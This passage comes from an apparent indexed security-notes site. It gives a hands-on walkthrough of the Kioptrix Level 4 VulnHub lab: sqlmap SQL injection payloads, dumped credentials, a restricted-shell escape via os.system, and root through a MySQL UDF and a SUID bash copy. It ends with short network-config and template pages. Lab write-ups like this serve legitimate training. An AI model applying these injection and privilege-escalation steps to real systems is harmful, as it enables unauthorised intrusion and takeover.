'1234');\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#sqli","title":"sqli","text":"<ul> <li>find the injection point</li> </ul> <ul> <li>copy packet data into local machine and use sqlmap to exp</li> <li>validate sqli</li> <li>dump username and password<ul> <li><code>john:MyNameIsJohn</code></li> <li><code>robert:ADGAdsafdfwt4gadfga==</code></li> </ul> </li> </ul> <pre><code>$ cat post.txt\nPOST /checklogin.php HTTP/1.1\nHost: 192.168.123.93\nContent-Length: 56\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.123.93\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.123.93/index.php?\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nmyusername=admin&amp;mypassword=admin&amp;Submit=Login\n</code></pre> <pre><code>$ sqlmap -r post.txt --batch --level 5\n\nsqlmap identified the following injection point(s) with a total of 1464 HTTP(s) requests:\n---\nParameter: mypassword (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: myusername=admin&amp;mypassword=admin' AND 2376=(SELECT (CASE WHEN (2376=2376) THEN 2376 ELSE (SELECT 2392 UNION SELECT 5042) END))-- -&amp;Submit=Login\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: myusername=admin&amp;mypassword=admin' AND (SELECT 8032 FROM (SELECT(SLEEP(5)))RhUh)-- GqgT&amp;Submit=Login\n---\n</code></pre> <pre><code>$ sqlmap -r post.txt --batch --level 3 --dbs\navailable databases [3]:\n[*] information_schema\n[*] members\n[*] mysql\n\n$ sqlmap -r post.txt --batch --level 3 -D members --tables\nDatabase: members\n[1 table]\n+---------+\n| members |\n+---------+\n\n$ sqlmap -r post.txt --batch --level 3 -D members -T members --dump\nDatabase: members\nTable: members\n[2 entries]\n+----+-----------------------+----------+\n| id | password              | username |\n+----+-----------------------+----------+\n| 1  | MyNameIsJohn          | john     |\n| 2  | ADGAdsafdfwt4gadfga== | robert   |\n+----+-----------------------+----------+\n</code></pre> <ul> <li>login page ok, nothing special in html source code</li> <li>guess passwords also can login by ssh</li> </ul> <ul> <li>ssh login ok, <code>$ ssh -oHostKeyAlgorithms=ssh-rsa john@$IP</code></li> <li>get a restricted shell</li> </ul> <pre><code>john@192.168.123.93's password:\nWelcome to LigGoat Security Systems - We are Watching\n== Welcome LigGoat Employee ==\nLigGoat Shell is in place so you  don't screw up\nType '?' or 'help' to get the list of allowed commands\njohn:~$ ?\ncd  clear  echo  exit  help  ll  lpath  ls\njohn:~$\n\njohn:~$ ll\ntotal 0\njohn:~$ ls\njohn:~$ cd ..\n*** forbidden path -&gt; \"/home/\"\n*** You have 0 warning(s) left, before getting kicked out.\nThis incident has been reported.\njohn:~$ ls\njohn:~$ ll\ntotal 0\njohn:~$ lpath\nAllowed:\n /home/john\njohn:~$ echo a shell\na shell\njohn:~$ sudo -l\n*** forbidden sudo -&gt; sudo -l\njohn:~$\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#priv-esca","title":"priv-esca","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#bypass-restricted-shell","title":"bypass restricted shell","text":"<p>If the restricted shell is implemented by python, commands might be writted like:</p> <ul> <li>os.system()</li> <li>os.popen()</li> <li>subprocess.popen()</li> <li>subprocess.call()</li> <li>subprocess.run()</li> <li>subprocess.getstatusoutput()</li> </ul> <p>So, construct similar expression to execute unallowed commands on Linux:</p> <pre><code>john:~$ ls os.system('id')\nuid=1001(john) gid=1001(john) groups=1001(john)\nsh: Syntax error: \"(\" unexpected\njohn:~$ ls os.system('bash')\njohn@Kioptrix4:~$\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#enum","title":"enum","text":"<ul> <li>basic info of machine</li> </ul> <pre><code>john@Kioptrix4:~$ id\nuid=1001(john) gid=1001(john) groups=1001(john)\njohn@Kioptrix4:~$ ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:a9:40:2b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.93/24 brd 192.168.123.255 scope global eth1\njohn@Kioptrix4:~$ uname -a\nLinux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\njohn@Kioptrix4:~$ cat /etc/*release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=8.04\nDISTRIB_CODENAME=hardy\nDISTRIB_DESCRIPTION=\"Ubuntu 8.04.3 LTS\"\njohn@Kioptrix4:~$\n</code></pre> <ul> <li>sudo, suid, guid [x]</li> </ul> <pre><code>john@Kioptrix4:~$ sudo -l\n[sudo] password for john:\nSorry, user john may not run sudo on Kioptrix4.\njohn@Kioptrix4:~$ find / -type f -perm -u=s 2&gt;/dev/null\n/usr/lib/apache2/suexec\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/traceroute6.iputils\n/usr/bin/newgrp\n/usr/bin/sudoedit [x]\n/usr/bin/chfn\n/usr/bin/arping\n/usr/bin/gpasswd\n/usr/bin/mtr\n/usr/bin/passwd\n/usr/bin/at\n/usr/sbin/pppd\n/usr/sbin/uuidd\n/lib/dhcp3-client/call-dhclient-script\n/bin/mount\n/bin/ping6\n/bin/fusermount\n/bin/su\n/bin/ping\n/bin/umount\n/sbin/umount.cifs\n/sbin/mount.cifs\n</code></pre> <ul> <li>crontab [x]</li> <li>kernel priv esca (not tried)</li> </ul> <pre><code>$ searchsploit linux kernel ubuntu 2.6.24 Priv\nLinux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privi | linux_x86-64/local/9083.c\nLinux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege Escalation (1)                                            | linux_x86/local/15916.c\nLinux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)                                        | linux/local/15944.c\nLinux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                                             | linux/local/14814.c\nLinux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                                                 | linux/local/17787.c\nLinux Kernel &lt; 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                                              | linux_x86-64/local/34134.c\nLinux Kernel &lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation                                    | linux_x86-64/local/44299.c\nLinux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                        | linux/local/45010.c\nLinux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                               | linux/local/44298.c\nLinux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                    | linux_x86-64/local/44300.c\nLinux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/43418.c\nLinux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)            | linux/local/47169.c\n</code></pre> <ul> <li>process, listen-state port</li> <li><code>$ ps -ef | grep mysql</code></li> <li><code>netstat -tunlp</code></li> <li>find mysql availabe, root priv</li> </ul> <pre><code>john@Kioptrix4:~$ ps -ef | grep mysql\nroot      5137     1  0 15:02 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe\nroot      5179  5137  0 15:02 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-exter\nroot      5180  5137  0 15:02 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld\njohn      5449  5412  0 15:59 pts/0    00:00:00 grep mysql\njohn@Kioptrix4:~$ netstat -tunlp\n(No info could be read for \"-p\": geteuid()=1001 but you should be root.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -\nudp        0      0 192.168.123.93:137      0.0.0.0:*                           -\nudp        0      0 0.0.0.0:137             0.0.0.0:*                           -\nudp        0      0 192.168.123.93:138      0.0.0.0:*                           -\nudp        0      0 0.0.0.0:138             0.0.0.0:*                           -\nudp        0      0 0.0.0.0:68              0.0.0.0:*                           -\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.3%20%284%29/#mysql-udf","title":"mysql - udf","text":"<ul> <li>validate lib_mysqludf_sys.so file</li> <li>validate useful config: secure_file_priv</li> </ul> <pre><code>robert@Kioptrix4:/$ whereis lib_mysqludf_sys.so\nlib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so\nrobert@Kioptrix4:/$ # mysql udf installed: yes\nrobert@Kioptrix4:/$ mysql -u root\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 34526\nServer version: 5.0.51a-3ubuntu5.4 (Ubuntu)\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the buffer.\n\nmysql&gt; show global variables like '%secure%';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select @@version;\n+--------------------+\n| @@version          |\n+--------------------+\n| 5.0.51a-3ubuntu5.4 |\n+--------------------+\n1 row in set (0.00 sec)\n</code></pre> <ul> <li>create udf: sys_eval by lib_mysqludf_sys.so</li> <li>copy bash shell into /tmp dir, set suid to /tmp/rbash</li> </ul> <pre><code>mysql&gt; use mysql;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql&gt; create function sys_eval returns string soname 'lib_mysqludf_sys.so';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; select sys_eval('id');\n+--------------------------+\n| sys_eval('id')           |\n+--------------------------+\n| uid=0(root) gid=0(root)\n |\n+--------------------------+\n1 row in set (0.00 sec)\n\nmysql&gt; select sys_eval('cp /bin/bash /tmp/rbash; chmod +xs /tmp/rbash');\n+-----------------------------------------------------------+\n| sys_eval('cp /bin/bash /tmp/rbash; chmod +xs /tmp/rbash') |\n+-----------------------------------------------------------+\n|                                                           |\n+---------------------------------------\n</code></pre> <ul> <li>run rbash on privileged mode -&gt; get root</li> </ul> <pre><code>robert@Kioptrix4:/tmp$ ls\nrbash\nrobert@Kioptrix4:/tmp$ ./rbash -p\nrbash-3.2# id\nuid=1002(robert) gid=1002(robert) euid=0(root) egid=0(root) groups=1002(robert)\nrbash-3.2# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:0c:29:a9:40:2b brd ff:ff:ff:ff:ff:ff\n    inet 192.168.123.93/24 brd 192.168.123.255 scope global eth1\nrbash-3.2# uname -a\nLinux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\nrbash-3.2$ cat congrats.txt\nCongratulations!\nYou've got root.\n\nThere is more then one way to get root on this system. Try and find them.\nI've only tested two (2) methods, but it doesn't mean there aren't more.\nAs always there's an easy way, and a not so easy way to pop this box.\nLook for other methods to get root privileges other than running an exploit.\n\nIt took a while to make this. For one it's not as easy as it may look, and\nalso work and family life are my priorities. Hobbies are low on my list.\nReally hope you enjoyed this one.\n\nIf you haven't already, check out the other VMs available on:\nwww.kioptrix.com\n\nThanks for playing,\nloneferret\n</code></pre> <ul> <li>If no <code>lib_mysqludf_sys.so</code> exists, use this exp method: <code>$ searchsploit udf 5.0 -m 1518</code></li> </ul> <pre><code>$ searchsploit udf 5.0\n------------------------------------------------ ---------------------------------\n Exploit Title                                  |  Path\n------------------------------------------------ ---------------------------------\nMySQL 4.x/5.0 (Linux) - User-Defined Function ( | linux/local/1518.c\nMySQL 4.x/5.0 (Windows) - User-Defined Function | windows/remote/3274.txt\n------------------------------------------------ ---------------------------------\nShellcodes: No Results\n\n * Usage:\n * $ id\n * uid=500(raptor) gid=500(raptor) groups=500(raptor)\n * $ gcc -g -c raptor_udf2.c\n * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n * $ mysql -u root -p\n * Enter password:\n * [...]\n * mysql&gt; use mysql;\n * mysql&gt; create table foo(line blob);\n * mysql&gt; insert into foo values(load_file('/home/raptor/raptor_udf2.so'));\n * mysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';\n * mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';\n * mysql&gt; select * from mysql.func;\n * +-----------+-----+----------------+----------+\n * | name      | ret | dl             | type     |\n * +-----------+-----+----------------+----------+\n * | do_system |   2 | raptor_udf2.so | function |\n * +-----------+-----+----------------+----------+\n * mysql&gt; select do_system('id &gt; /tmp/out; chown raptor.raptor /tmp/out');\n * mysql&gt; \\! sh\n * sh-2.05b$ cat /tmp/out\n * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n</code></pre>"},{"location":"Write-ups/vulnhub/network-config/","title":"Network Config","text":""},{"location":"Write-ups/vulnhub/network-config/#env","title":"ENV","text":"<ul> <li>wsl2 - kali linux</li> <li>vmware workstation - machines</li> </ul>"},{"location":"Write-ups/vulnhub/network-config/#network","title":"Network","text":"<p>all connect to WLAN</p> <ul> <li>wsl2</li> </ul> <pre><code># on win\nGet-NetAdapter\nSet-VMSwitch WSL -NetAdapterName WLAN\n\n# on kali\nsudo ip addr del $(ip addr show eth0 | grep 'inet\\b' | awk '{print $2}' | head -n 1) dev eth0\nsudo ip addr add 192.168.1.99/24 broadcast 192.168.1.255 dev eth0\nsudo ip route add 0.0.0.0/0 via 192.168.1.1 dev eth0\n</code></pre> <ul> <li>vmware machine: bridge mode (a hyper-v virtual switch)</li> </ul>"},{"location":"Write-ups/vulnhub/network-config/#create-hyper-v-virtual-switch","title":"create hyper-v virtual switch","text":""},{"location":"Write-ups/vulnhub/network-config/#wsl2-bridge-config","title":"wsl2 bridge config","text":"<p>instead of changing ip addr using ip command, change config file of wsl2 on windows:</p> <pre><code>[wsl2]\nprocessors=4\nmemory=8GB\nswap=0\n\n[wsl2]\nnetworkingMode=bridged\nvmSwitch=WSL-Switch\nipv6=true\n</code></pre>"},{"location":"Write-ups/vulnhub/template/","title":"Template","text":""},{"location":"Write-ups/vulnhub/template/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/vulnhub/template/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/template/#recon","title":"recon","text":""},{"location":"Write-ups/vulnhub/template/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/template/#priv-esc","title":"priv-esc","text":""}]}